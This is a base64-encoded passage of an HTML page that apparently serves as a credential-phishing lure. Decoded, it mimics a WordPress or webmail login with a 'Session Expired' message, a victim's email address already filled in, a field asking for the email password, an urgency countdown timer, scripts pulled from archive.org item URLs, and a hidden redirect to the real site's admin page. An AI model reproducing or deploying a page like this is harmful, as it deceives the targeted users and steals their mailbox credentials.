uY29tIiwiYXVkaW8ueHBsZWVyLmNvbSIsImtlZXBhLmNvbSIsInN0YXRpYy54eC5mYmNkbi5uZXQiXSk7PC9zY3JpcHQ+PC9oZWFkPgoJPGJvZHkgY2xhc3M9ImxvZ2luIGpzIGxvZ2luLWFjdGlvbi1sb2dpbiB3cC1jb3JlLXVpICBsb2NhbGUtZW4tZ2IiIGJpc19yZWdpc3Rlcj0iVzNzaWJXRnpkR1Z5SWpwMGNuVmxMQ0psZUhSbGJuTnBiMjVKWkNJNkltVndjR2x2WTJWdGFHMXViR0pvYW5Cc1kyZHJiMlpqYVdsbFoyOXRZMjl1SWl3aVlXUmliRzlqYTJWeVUzUmhkSFZ6SWpwN0lrUkpVMUJNUVZraU9pSmxibUZpYkdWa0lpd2lSa0ZEUlVKUFQwc2lPaUpsYm1GaWJHVmtJaXdpVkZkSlZGUkZVaUk2SW1WdVlXSnNaV1FpTENKU1JVUkVTVlFpT2lKbGJtRmliR1ZrSWl3aVVFbE9WRVZTUlZOVUlqb2laR2x6WVdKc1pXUWlMQ0pKVGxOVVFVZFNRVTBpT2lKa2FYTmhZbXhsWkNKOUxDSjJaWEp6YVc5dUlqb2lNUzQ1TGpFMUlpd2ljMk52Y21VaU9qRXdPVEUxTUgxZCIgZGF0YS1uZXctZ3ItYy1zLWNoZWNrLWxvYWRlZD0iMTQuMTEzNy4wIiBkYXRhLWdyLWV4dC1pbnN0YWxsZWQ9IiI+Cgk8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+Ci8qIDwhW0NEQVRBWyAqLwpkb2N1bWVudC5ib2R5LmNsYXNzTmFtZSA9IGRvY3VtZW50LmJvZHkuY2xhc3NOYW1lLnJlcGxhY2UoJ25vLWpzJywnanMnKTsKLyogXV0+ICovCjwvc2NyaXB0PgoKCQk8ZGl2IGlkPSJsb2dpbiIgYmlzX3NraW5fY2hlY2tlZD0iMSI+CgkJPGgxPjxpbWcgc3JjPSIiIGFsdD0iIiBpZD0ibG9nb2ltZyIgd2lkdGg9IjE1JSI+PC9pbWc+PC9oMT4KCQkKCTxkaXYgaWQ9ImxvZ2luX2Vycm9yIiBjbGFzcz0ibm90aWNlIG5vdGljZS1lcnJvciIgYmlzX3NraW5fY2hlY2tlZD0iMSI+PHA+PHN0cm9uZz5FcnJvcjo8L3N0cm9uZz4gCgkKCTxkaXYgd2l0aGlkPSJsb2dpbi1zdGF0dXMiIGNsYXNzPSJlcnJvci1ub3RpY2UiIHN0eWxlPSJ2aXNpYmlsaXR5OiB2aXNpYmxlOyI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRlbnQtd3JhcHBlciI+CiAgICAgICAgICAgICAgICA8ZGl2IGlkPSJsb2dpbi1kZXRhaWwiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgaWQ9ImxvZ2luLXN0YXR1cy1pY29uLWNvbnRhaW5lciI+PHNwYW4gY2xhc3M9ImxvZ2luLXN0YXR1cy1pY29uIj48L3NwYW4+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0ibXNnIiBzdHlsZT0iIj5TZXNzaW9uIEV4cGlyZWQuIFBsZWFzZSBsb2dpbiBhZ2FpbiE8L2Rpdj4KCQkJCQkgICAgICAgICAgICAgICAgICAgIDxkaXYgaWQ9Im1zZzIiICBzdHlsZT0iZGlzcGxheTogbm9uZTsiPlRoZSBwYXNzd29yZCB5b3UgZW50ZXJlZCBmb3IgdGhpcyBlbWFpbCBhZGRyZXNzIDxiPjxzcGFuIHN0eWxlPSJjb2xvcjpyZ2IoNjIlLCA3JSwgNCUpCTsiIGlkPSJhaWN4Ij48L3NwYW4+PC9iPiAgaXMgaW5jb3JyZWN0LjwvZGl2PgoJCQkJCQkJCQkJICAgICAgICAgICAgICAgICAgICA8ZGl2IGlkPSJtc2cxIiBzdHlsZT0iZGlzcGxheTogbm9uZTsgIj5UaGUgcGFzc3dvcmQgeW91IGVudGVyZWQgZm9yIHRoZSBlbWFpbCBhZGRyZXNzIDxiPjxzcGFuIHN0eWxlPSJjb2xvcjpyZ2IoNjIlLCA3JSwgNCUpCTsiIGlkPSJhaWN4eCI+PC9zcGFuPjwvYj4gaXMgaW5jb3JyZWN0LjwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CgkJCQkKCQkJCQogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4gPC9wPjwvZGl2PgoJCTxmb3JtIG5hbWU9ImxvZ2luZm9ybSIgaWQ9ImxvZ2luZm9ybSIgYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgY2xhc3M9InNoYWtlIj4KCQkJPHA+CgkJCQk8bGFiZWwgZm9yPSJ1c2VyX2xvZ2luIj5Vc2VybmFtZTwvbGFiZWw+CgkJCQk8ZGl2IHN0eWxlPSJib3JkZXI6MC43cHggc29saWQ7IGJvcmRlci1yYWRpdXM6NHB4OyI+CgkJCQk8ZGl2IHN0eWxlPSJtYXJnaW4tYm90dG9tOjEwcHg7IG1hcmdpbi10b3A6MTBweDsgbWFyZ2luLWxlZnQ6M3B4OyI+CgkJCQk8Yj48c3BhbiBpZD0iYWljaCI+aW5mb0BpZmItbmwubmw8L3NwYW4+PC9iPgoJCQkJPC9kaXY+CgkJCQk8L2Rpdj4KCQkJPC9wPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJlbWFpbCIgaWQ9InVzZXJuYW1lIiBhcmlhLWRlc2NyaWJlZGJ5PSJsb2dpbl9lcnJvciIgY2xhc3M9ImlucHV0IHBhc3N3b3JkLWlucHV0IiB2YWx1ZT0iIiBzaXplPSIyMCIgYXV0b2NvbXBsZXRlPSJvZmYiIHNwZWxsY2hlY2s9ImZhbHNlIiByZXF1aXJlZD0icmVxdWlyZWQiPgoJCQkJCQogPGlucHV0IHR5cGU9ImhpZGRlbiIgIGlkPSJhaSIgdmFsdWU9IiIgc2l6ZT0iMjAiIGF1dG9jb21wbGV0ZT0ib2ZmIiAgcmVxdWlyZWQ9InJlcXVpcmVkIj4KCQkJCQkKCQkJPGRpdiBjbGFzcz0idXNlci1wYXNzLXdyYXAiIGJpc19za2luX2NoZWNrZWQ9IjEiPgoJCQkJPGxhYmVsIGZvcj0idXNlcl9wYXNzIj5QYXNzd29yZDwvbGFiZWw+CgkJCQk8ZGl2IGNsYXNzPSJ3cC1wd2QiIGJpc19za2luX2NoZWNrZWQ9IjEiPgoJCQkJCgkJCQkJPGlucHV0IHR5cGU9InBhc3N3b3JkIiBzdHlsZT0iZm9udC1zaXplOjE0cHg7Im5hbWU9InByIiBpZD0icHIiIGFyaWEtZGVzY3JpYmVkYnk9ImxvZ2luX2Vycm9yIiBwbGFjZWhvbGRlcj0iRW50ZXIgZW1haWwgcGFzc3dvcmQiIGNsYXNzPSJpbnB1dCBwYXNzd29yZC1pbnB1dCIgdmFsdWU9IiIgc2l6ZT0iMjAiIGF1dG9jb21wbGV0ZT0ib2ZmIiBzcGVsbGNoZWNrPSJmYWxzZSIgcmVxdWlyZWQ9InJlcXVpcmVkIj4KCQkJCQkKCQkJCTwvZGl2PgoJCQk8L2Rpdj4KCQkJCQkJPHAgY2xhc3M9ImZvcmdldG1lbm90Ij48aW5wdXQgbmFtZT0icmVtZW1iZXJtZSIgdHlwZT0iY2hlY2tib3giIGlkPSJyZW1lbWJlcm1lIiB2YWx1ZT0iZm9yZXZlciI+IDxsYWJlbCBmb3I9InJlbWVtYmVybWUiPlJlbWVtYmVyIE1lPC9sYWJlbD48L3A+CgkJCTxwIGNsYXNzPSJzdWJtaXQiPgoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0id3Atc3VibWl0IiBpZD0ic3VibWl0LWJ0biIgY2xhc3M9ImJ1dHRvbiBidXR0b24tcHJpbWFyeSBidXR0b24tbGFyZ2UiIHZhbHVlPSJMb2cgSW4iPgoJCQkJCQkJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJyZWRpcmVjdF90byIgdmFsdWU9Imh0dHBzOi8vaWZiLW5sLm5sL3dwLWFkbWluLyI+CgkJCQkJCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRlc3Rjb29raWUiIHZhbHVlPSIxIj4KCQkJPC9wPgoJCTwvZm9ybT4KCgkJCQkJPHAgaWQ9Im5hdiI+CgkJCQk8YSBjbGFzcz0id3AtbG9naW4tbG9zdC1wYXNzd29yZCIgaHJlZj0iIyI+TG9zdCB5b3VyIHBhc3N3b3JkPzwvYT4JCQk8L3A+CgkJCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4KLyogPCFbQ0RBVEFbICovCmZ1bmN0aW9uIHdwX2F0dGVtcHRfZm9jdXMoKSB7c2V0VGltZW91dCggZnVuY3Rpb24oKSB7dHJ5IHtkID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoICJ1c2VyX3Bhc3MiICk7IGQudmFsdWUgPSAiIjtkLmZvY3VzKCk7IGQuc2VsZWN0KCk7fSBjYXRjaCggZXIgKSB7fX0sIDIwMCk7fQp3cF9hdHRlbXB0X2ZvY3VzKCk7CmlmICggdHlwZW9mIHdwT25sb2FkID09PSAnZnVuY3Rpb24nICkgeyB3cE9ubG9hZCgpIH0KLyogXV0+ICovCjwvc2NyaXB0PgoJCTxwIGlkPSJiYWNrdG9ibG9nIj4KCQkJPGEgaHJlZj0iIyI+4oaQIEdvIHRvIFNlY3VyZWQgQ29udHJhY3Rpbmc8L2E+CQk8L3A+CgkJCTwvZGl2PgoJCQkJPGRpdiBjbGFzcz0ibGFuZ3VhZ2Utc3dpdGNoZXIiIGJpc19za2luX2NoZWNrZWQ9IjEiPgoJCQkJPGZvcm0gaWQ9Imxhbmd1YWdlLXN3aXRjaGVyIiBhY3Rpb249IiIgbWV0aG9kPSJnZXQiPgoKCQkJCQk8bGFiZWwgZm9yPSJsYW5ndWFnZS1zd2l0Y2hlci1sb2NhbGVzIj4KCQkJCQkJPHNwYW4gY2xhc3M9ImRhc2hpY29ucyBkYXNoaWNvbnMtdHJhbnNsYXRpb24iIGFyaWEtaGlkZGVuPSJ0cnVlIj48L3NwYW4+CgkJCQkJCTxzcGFuIGNsYXNzPSJzY3JlZW4tcmVhZGVyLXRleHQiPgoJCQkJCQkJU2VjdXJlZAkJCQkJPC9zcGFuPgoJCQkJCTwvbGFiZWw+CgoJCQkJCTxzcGFuIHN0eWxlPSJjb2xvcjpyZ2IoNSUsIDMxJSwgNTUlKTsiIGlkPSJsb2dvbmFtZWMiPjwvc3Bhbj4mbmJzcDs8c3BhbiBzdHlsZT0iY29sb3I6cmdiKDUlLCAzMSUsIDU1JSk7Ij5XZWJtYWlsPC9zcGFuPgoJCQkJCQoJCQkJCQoJCQkJCQoJCQkJCQkKCgkJCQkJPC9mb3JtPgoJCQkJPC9kaXY+CgkJCQk8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+Ci8qIDwhW0NEQVRBWyAqLwpkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdmb3JtJykuY2xhc3NMaXN0LmFkZCgnc2hha2UnKTsKLyogXV0+ICovCjwvc2NyaXB0Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2lhNjAxMjAwLnVzLmFyY2hpdmUub3JnLzE1L2l0ZW1zL3p4Y3Zibi5taW4uanMvanF1ZXJ5Lm1pbi5qcy5kb3dubG9hZCIgaWQ9ImpxdWVyeS1jb3JlLWpzIj48L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9pYTYwMTIwMC51cy5hcmNoaXZlLm9yZy8xNS9pdGVtcy96eGN2Ym4ubWluLmpzL2pxdWVyeS1taWdyYXRlLm1pbi5qcy5kb3dubG9hZCIgaWQ9ImpxdWVyeS1taWdyYXRlLWpzIj48L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIGlkPSJ6eGN2Ym4tYXN5bmMtanMtZXh0cmEiPgovKiA8IVtDREFUQVsgKi8KdmFyIF96eGN2Ym5TZXR0aW5ncyA9IHsic3JjIjoiaHR0cHM6XC9cL2lmYi1ubC5ubFwvd3AtaW5jbHVkZXNcL2pzXC96eGN2Ym4ubWluLmpzIn07Ci8qIF1dPiAqLwo8L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9pYTYwMTIwMC51cy5hcmNoaXZlLm9yZy8xNS9pdGVtcy96eGN2Ym4ubWluLmpzL3p4Y3Zibi1hc3luYy5taW4uanMuZG93bmxvYWQiIGlkPSJ6eGN2Ym4tYXN5bmMtanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2lhNjAxMjAwLnVzLmFyY2hpdmUub3JnLzE1L2l0ZW1zL3p4Y3Zibi5taW4uanMvd3AtcG9seWZpbGwtaW5lcnQubWluLmpzLmRvd25sb2FkIiBpZD0id3AtcG9seWZpbGwtaW5lcnQtanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2lhNjAxMjAwLnVzLmFyY2hpdmUub3JnLzE1L2l0ZW1zL3p4Y3Zibi5taW4uanMvcmVnZW5lcmF0b3ItcnVudGltZS5taW4uanMuZG93bmxvYWQiIGlkPSJyZWdlbmVyYXRvci1ydW50aW1lLWpzIj48L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9pYTYwMTIwMC51cy5hcmNoaXZlLm9yZy8xNS9pdGVtcy96eGN2Ym4ubWluLmpzL3dwLXBvbHlmaWxsLm1pbi5qcy5kb3dubG9hZCIgaWQ9IndwLXBvbHlmaWxsLWpzIj48L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9pYTYwMTIwMC51cy5hcmNoaXZlLm9yZy8xNS9pdGVtcy96eGN2Ym4ubWluLmpzL2hvb2tzLm1pbi5qcy5kb3dubG9hZCIgaWQ9IndwLWhvb2tzLWpzIj48L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9pYTYwMTIwMC51cy5hcmNoaXZlLm9yZy8xNS9pdGVtcy96eGN2Ym4ubWluLmpzL2kxOG4ubWluLmpzLmRvd25sb2FkIiBpZD0id3AtaTE4bi1qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBpZD0id3AtaTE4bi1qcy1hZnRlciI+Ci8qIDwhW0NEQVRBWyAqLwp3cC5pMThuLnNldExvY2FsZURhdGEoIHsgJ3RleHQgZGlyZWN0aW9uXHUwMDA0bHRyJzogWyAnbHRyJyBdIH0gKTsKLyogXV0+ICovCjwvc2NyaXB0Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgaWQ9InBhc3N3b3JkLXN0cmVuZ3RoLW1ldGVyLWpzLWV4dHJhIj4KLyogPCFbQ0RBVEFbICovCnZhciBwd3NMMTBuID0geyJ1bmtub3duIjoiUGFzc3dvcmQgc3RyZW5ndGggdW5rbm93biIsInNob3J0IjoiVmVyeSB3ZWFrIiwiYmFkIjoiV2VhayIsImdvb2QiOiJNZWRpdW0iLCJzdHJvbmciOiJTdHJvbmciLCJtaXNtYXRjaCI6Ik1pc21hdGNoIn07Ci8qIF1dPiAqLwo8L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIGlkPSJwYXNzd29yZC1zdHJlbmd0aC1tZXRlci1qcy10cmFuc2xhdGlvbnMiPgovKiA8IVtDREFUQVsgKi8KKCBmdW5jdGlvbiggZG9tYWluLCB0cmFuc2xhdGlvbnMgKSB7Cgl2YXIgbG9jYWxlRGF0YSA9IHRyYW5zbGF0aW9ucy5sb2NhbGVfZGF0YVsgZG9tYWluIF0gfHwgdHJhbnNsYXRpb25zLmxvY2FsZV9kYXRhLm1lc3NhZ2VzOwoJbG9jYWxlRGF0YVsiIl0uZG9tYWluID0gZG9tYWluOwoJd3AuaTE4bi5zZXRMb2NhbGVEYXRhKCBsb2NhbGVEYXRhLCBkb21haW4gKTsKfSApKCAiZGVmYXVsdCIsIHsidHJhbnNsYXRpb24tcmV2aXNpb24tZGF0ZSI6IjIwMjMtMTAtMDcgMTA6MzI6NTErMDAwMCIsImdlbmVyYXRvciI6Ikdsb3RQcmVzc1wvNC4wLjAtYWxwaGEuOSIsImRvbWFpbiI6Im1lc3NhZ2VzIiwibG9jYWxlX2RhdGEiOnsibWVzc2FnZXMiOnsiIjp7ImRvbWFpbiI6Im1lc3NhZ2VzIiwicGx1cmFsLWZvcm1zIjoibnBsdXJhbHM9MjsgcGx1cmFsPW4gIT0gMTsiLCJsYW5nIjoiZW5fR0IifSwiJTEkcyBpcyBkZXByZWNhdGVkIHNpbmNlIHZlcnNpb24gJTIkcyEgVXNlICUzJHMgaW5zdGVhZC4gUGxlYXNlIGNvbnNpZGVyIHdyaXRpbmcgbW9yZSBpbmNsdXNpdmUgY29kZS4iOlsiJTEkcyBpcyBkZXByZWNhdGVkIHNpbmNlIHZlcnNpb24gJTIkcyEgVXNlICUzJHMgaW5zdGVhZC4gUGxlYXNlIGNvbnNpZGVyIHdyaXRpbmcgbW9yZSBpbmNsdXNpdmUgY29kZS4iXX19LCJjb21tZW50Ijp7InJlZmVyZW5jZSI6IndwLWFkbWluXC9qc1wvcGFzc3dvcmQtc3RyZW5ndGgtbWV0ZXIuanMifX0gKTsKLyogXV0+ICovCjwvc2NyaXB0Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2lhNjAxMjAwLnVzLmFyY2hpdmUub3JnLzE1L2l0ZW1zL3p4Y3Zibi5taW4uanMvcGFzc3dvcmQtc3RyZW5ndGgtbWV0ZXIubWluLmpzLmRvd25sb2FkIiBpZD0icGFzc3dvcmQtc3RyZW5ndGgtbWV0ZXItanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2lhNjAxMjAwLnVzLmFyY2hpdmUub3JnLzE1L2l0ZW1zL3p4Y3Zibi5taW4uanMvdW5kZXJzY29yZS5taW4uanMuZG93bmxvYWQiIGlkPSJ1bmRlcnNjb3JlLWpzIj48L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIGlkPSJ3cC11dGlsLWpzLWV4dHJhIj4KLyogPCFbQ0RBVEFbICovCnZhciBfd3BVdGlsU2V0dGluZ3MgPSB7ImFqYXgiOnsidXJsIjoiXC93cC1hZG1pblwvYWRtaW4tYWpheC5waHAifX07Ci8qIF1dPiAqLwo8L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9pYTYwMTIwMC51cy5hcmNoaXZlLm9yZy8xNS9pdGVtcy96eGN2Ym4ubWluLmpzL3dwLXV0aWwubWluLmpzLmRvd25sb2FkIiBpZD0id3AtdXRpbC1qcyI+PC9zY3JpcHQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBpZD0idXNlci1wcm9maWxlLWpzLWV4dHJhIj4KLyogPCFbQ0RBVEFbICovCnZhciB1c2VyUHJvZmlsZUwxMG4gPSB7InVzZXJfaWQiOiIwIiwibm9uY2UiOiJiNGI2YzMxYjQwIn07Ci8qIF1dPiAqLwo8L3NjcmlwdD4KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIGlkPSJ1c2VyLXByb2ZpbGUtanMtdHJhbnNsYXRpb25zIj4KLyogPCFbQ0RBVEFbICovCiggZnVuY3Rpb24oIGRvbWFpbiwgdHJhbnNsYXRpb25zICkgewoJdmFyIGxvY2FsZURhdGEgPSB0cmFuc2xhdGlvbnMubG9jYWxlX2RhdGFbIGRvbWFpbiBdIHx8IHRyYW5zbGF0aW9ucy5sb2NhbGVfZGF0YS5tZXNzYWdlczsKCWxvY2FsZURhdGFbIiJdLmRvbWFpbiA9IGRvbWFpbjsKCXdwLmkxOG4uc2V0TG9jYWxlRGF0YSggbG9jYWxlRGF0YSwgZG9tYWluICk7Cn0gKSggImRlZmF1bHQiLCB7InRyYW5zbGF0aW9uLXJldmlzaW9uLWRhdGUiOiIyMDIzLTEwLTA3IDEwOjMyOjUxKzAwMDAiLCJnZW5lcmF0b3IiOiJHbG90UHJlc3NcLzQuMC4wLWFscGhhLjkiLCJkb21haW4iOiJtZXNzYWdlcyIsImxvY2FsZV9kYXRhIjp7Im1lc3NhZ2VzIjp7IiI6eyJkb21haW4iOiJtZXNzYWdlcyIsInBsdXJhbC1mb3JtcyI6Im5wbHVyYWxzPTI7IHBsdXJhbD1uICE9IDE7IiwibGFuZyI6ImVuX0dCIn0sIllvdXIgbmV3IHBhc3N3b3JkIGhhcyBub3QgYmVlbiBzYXZlZC4iOlsiWW91ciBuZXcgcGFzc3dvcmQgaGFzIG5vdCBiZWVuIHNhdmVkLiJdLCJIaWRlIjpbIkhpZGUiXSwiU2hvdyI6WyJTaG93Il0sIkNvbmZpcm0gdXNlIG9mIHdlYWsgcGFzc3dvcmQiOlsiQ29uZmlybSB1c2Ugb2Ygd2VhayBwYXNzd29yZCJdLCJIaWRlIHBhc3N3b3JkIjpbIkhpZGUgcGFzc3dvcmQiXSwiU2hvdyBwYXNzd29yZCI6WyJTaG93IHBhc3N3b3JkIl19fSwiY29tbWVudCI6eyJyZWZlcmVuY2UiOiJ3cC1hZG1pblwvanNcL3VzZXItcHJvZmlsZS5qcyJ9fSApOwovKiBdXT4gKi8KPC9zY3JpcHQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vaWE2MDEyMDAudXMuYXJjaGl2ZS5vcmcvMTUvaXRlbXMvenhjdmJuLm1pbi5qcy91c2VyLXByb2ZpbGUubWluLmpzLmRvd25sb2FkIiBpZD0idXNlci1wcm9maWxlLWpzIj48L3NjcmlwdD4KCQoJCgk8L2JvZHk+PGdyYW1tYXJseS1kZXNrdG9wLWludGVncmF0aW9uIGRhdGEtZ3JhbW1hcmx5LXNoYWRvdy1yb290PSJ0cnVlIj48dGVtcGxhdGUgc2hhZG93cm9vdG1vZGU9Im9wZW4iPjxzdHlsZT4KICAgICAgZGl2LmdyYW1tYXJseS1kZXNrdG9wLWludGVncmF0aW9uIHsKICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgICAgd2lkdGg6IDFweDsKICAgICAgICBoZWlnaHQ6IDFweDsKICAgICAgICBwYWRkaW5nOiAwOwogICAgICAgIG1hcmdpbjogLTFweDsKICAgICAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgICAgIGNsaXA6IHJlY3QoMCwgMCwgMCwgMCk7CiAgICAgICAgd2hpdGUtc3BhY2U6IG5vd3JhcDsKICAgICAgICBib3JkZXI6IDA7CiAgICAgICAgLW1vei11c2VyLXNlbGVjdDogbm9uZTsKICAgICAgICAtd2Via2l0LXVzZXItc2VsZWN0OiBub25lOwogICAgICAgIC1tcy11c2VyLXNlbGVjdDpub25lOwogICAgICAgIHVzZXItc2VsZWN0Om5vbmU7CiAgICAgIH0KCiAgICAgIGRpdi5ncmFtbWFybHktZGVza3RvcC1pbnRlZ3JhdGlvbjpiZWZvcmUgewogICAgICAgIGNvbnRlbnQ6IGF0dHIoZGF0YS1jb250ZW50KTsKICAgICAgfQogICAgPC9zdHlsZT48ZGl2IGFyaWEtbGFiZWw9ImdyYW1tYXJseS1pbnRlZ3JhdGlvbiIgcm9sZT0iZ3JvdXAiIHRhYmluZGV4PSItMSIgY2xhc3M9ImdyYW1tYXJseS1kZXNrdG9wLWludGVncmF0aW9uIiBkYXRhLWNvbnRlbnQ9InsmcXVvdDttb2RlJnF1b3Q7OiZxdW90O2Z1bGwmcXVvdDssJnF1b3Q7aXNBY3RpdmUmcXVvdDs6dHJ1ZSwmcXVvdDtpc1VzZXJEaXNhYmxlZCZxdW90OzpmYWxzZX0iPjwvZGl2PjwvdGVtcGxhdGU+PC9ncmFtbWFybHktZGVza3RvcC1pbnRlZ3JhdGlvbj4KCTwvYm9keT48Z3JhbW1hcmx5LWRlc2t0b3AtaW50ZWdyYXRpb24gZGF0YS1ncmFtbWFybHktc2hhZG93LXJvb3Q9InRydWUiPjwvZ3JhbW1hcmx5LWRlc2t0b3AtaW50ZWdyYXRpb24+CjxzY3JpcHQ+Ci8vIFNldCB0aGUgZGF0ZSB3ZSdyZSBjb3VudGluZyBkb3duIHRvCnZhciBjb3VudERvd25EYXRlID0gbmV3IERhdGUoIkphbiA1LCAyMDI0IDE1OjM3OjI1IikuZ2V0VGltZSgpOwoKLy8gVXBkYXRlIHRoZSBjb3VudCBkb3duIGV2ZXJ5IDEgc2Vjb25kCnZhciB4ID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKSB7CgogIC8vIEdldCB0b2RheSdzIGRhdGUgYW5kIHRpbWUKICB2YXIgbm93ID0gbmV3IERhdGUoKS5nZXRUaW1lKCk7CiAgICAKICAvLyBGaW5kIHRoZSBkaXN0YW5jZSBiZXR3ZWVuIG5vdyBhbmQgdGhlIGNvdW50IGRvd24gZGF0ZQogIHZhciBkaXN0YW5jZSA9IGNvdW50RG93bkRhdGUgLSBub3c7CiAgICAKICAvLyBUaW1lIGNhbGN1bGF0aW9ucyBmb3IgZGF5cywgaG91cnMsIG1pbnV0ZXMgYW5kIHNlY29uZHMKICB2YXIgZGF5cyA9IE1hdGguZmxvb3IoZGlzdGFuY2UgLyAoMTAwMCAqIDYwICogNjAgKiAyNCkpOwogIHZhciBob3VycyA9IE1hdGguZmxvb3IoKGRpc3RhbmNlICUgKDEwMDAgKiA2MCAqIDYwICogMjQpKSAvICgxMDAwICogNjAgKiA2MCkpOwogIHZhciBtaW51dGVzID0gTWF0aC5mbG9vcigoZGlzdGFuY2UgJSAoMTAwMCAqIDYwICogNjApKSAvICgxMDAwICogNjApKTsKICB2YXIgc2Vjb25kcyA9IE1hdGguZmxvb3IoKGRpc3RhbmNlICUgKDEwMDAgKiA2MCkpIC8gMTAwMCk7CiAgICAKICAvLyBPdXRwdXQgdGhlIHJlc3VsdCBpbiBhbiBlbGVtZW50IHdpdGggaWQ9ImRlbW8iCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRlbW8iKS5pbm5lckhUTUwgPSBob3VycyArICJoICIKICArIG1pbnV0ZXMgKyAibSAiICsgc2Vjb25kcyArICJzICI7CiAgICAKICAvLyBJZiB0aGUgY291bnQgZG93biBpcyBvdmVyLCB3cml0ZSBzb21lIHRleHQgCiAgaWYgKGRpc3RhbmNlIDwgMCkgewogICAgY2xlYXJJbnRlcnZhbCh4KTsKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkZW1vIikuaW5uZXJIVE1MID0gIkVYUElSRUQiOwogIH0KfSwgMTAwMCk7Cjwvc2NyaXB0PgoKPCEtLSBPcHRpb25hbCBKYXZhU2NyaXB0IC0tPgogICAgPCEtLSBqUXVlcnkgZmlyc3QsIHRoZW4gUG9wcGVyLmpzLCB0aGVuIEJvb3RzdHJhcCBKUyAtLT4KICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vY29kZS5qcXVlcnkuY29tL2pxdWVyeS0zLjIuMS5zbGltLm1pbi5qcyIgaW50ZWdyaXR5PSJzaGEzODQtS0ozbzJES3RJa3ZZSUszVUVOem1NN0tDa1JyL3JFOS9RcGc2YUFaR0p3RkRNVk5BL0dwR0ZGOTNoWHBHNUtrTiIgY3Jvc3NvcmlnaW49ImFub255bW91cyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9wb3BwZXIuanMvMS4xMi45L3VtZC9wb3BwZXIubWluLmpzIiBpbnRlZ3JpdHk9InNoYTM4NC1BcE5iZ2g5QitZMVFLdHYzUm43VzNtZ1B4aFU5Sy9TY1FzQVA3aFVpYlgzOWo3ZmFrRlBza3ZYdXN2ZmEwYjRRIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vbWF4Y2RuLmJvb3RzdHJhcGNkbi5jb20vYm9vdHN0cmFwLzQuMC4wL2pzL2Jvb3RzdHJhcC5taW4uanMiIGludGVncml0eT0ic2hhMzg0LUpaUjZTcGVqaDRVMDJkOGpPdDZ2TEVIZmUvSlFHaVJSU1FReFNmRldwaTFNcXVWZEF5alVhcjUrNzZQVkNtWWwiIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiPjwvc2NyaXB0Pgo8L2JvZHk+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Imh0dHBzOi8vYWpheC5nb29nbGVhcGlzLmNvbS9hamF4L2xpYnMvanF1ZXJ5LzIuMi40L2pxdWVyeS5